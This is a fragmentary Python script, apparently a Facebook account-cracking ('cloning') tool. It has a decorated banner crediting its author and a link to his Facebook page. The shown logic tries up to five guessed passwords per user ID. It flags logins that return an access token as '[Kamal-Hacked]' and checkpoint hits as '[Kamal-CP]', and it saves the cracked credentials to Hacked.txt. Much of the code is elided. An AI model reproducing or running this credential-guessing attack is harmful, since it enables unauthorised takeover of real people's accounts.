...
try:
    ...
    time.sleep(1)
    os.system('Then type: python2 KAMAL4444.py')
...
\033[1;97m  ____________________██████
_________▓▓▓▓____█████████
__ Ƹ̵̡Ӝ̵̨̄Ʒ▓▓▓▓▓=▓____▓=▓▓▓▓▓
__ ▓▓▓_▓▓▓▓░●____●░░▓▓▓▓
_▓▓▓▓_▓▓▓▓▓░░__░░░░▓▓▓▓
...
\033[1;93m    ⛵ൠ  𝕂𝐀𝐦𝕒Ⓛ 𝕍ⓐ𝕌  💋🐣
 
\033[1;93m          👾Wait For End👾
 
\033[1;97m---------------New Tool--------------
 
\033[1;92m Owner  : Kamal Vau(Enjoy Free Cloning)
 ------------------------------------------------------------------------------------------------
           Facebook: anonymous.dark.trainer.Jisu.Vai
 
           Coder : Md Kamal Hossen
 ------------------------------------------------------------------------------------------------
...
def main_select():
    ...
    if IKB =="2":
        ...
        os.system("xdg-open https://www.facebook.com/anonymous.dark.trainer.Jisu.Vai")
	...
	def main(arg):
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		        ...
		        print("\x1b[1;93m[Kamal-CP] "+uid+" | "+pass1)
		    	...
		    	if "access_token" in d:
		            ...
		            print("\x1b[1;97m[Kamal-Hacked] "+uid+" | "+pass1+"\x1b[1;0m")
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        if 'access_token' in d:
		                            ...
		                            if 'www.facebook.com' in d['error_msg']:
		                                ...
		                                print("\x1b[1;93m[Kamal-CP] "+uid+" | "+pass4)
		                                ...
		                                if 'access_token' in d:
		                                    ...
		                                    print("\x1b[1;97m[Kamal-Hacked] "+uid+" | "+pass4+"\x1b[1;0m")
		                                    ...
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        ...
		                                        print("\x1b[1;93m[Kamal-CP] "+uid+" | "+pass5)
		                                        ...
		                                        if 'access_token' in d:
		                                            ...
		                                            print("\x1b[1;97m[Kamal-Hacked] "+uid+" | "+pass5+"\x1b[1;0m")
 
		                                            ok=open("Hacked.txt","a")
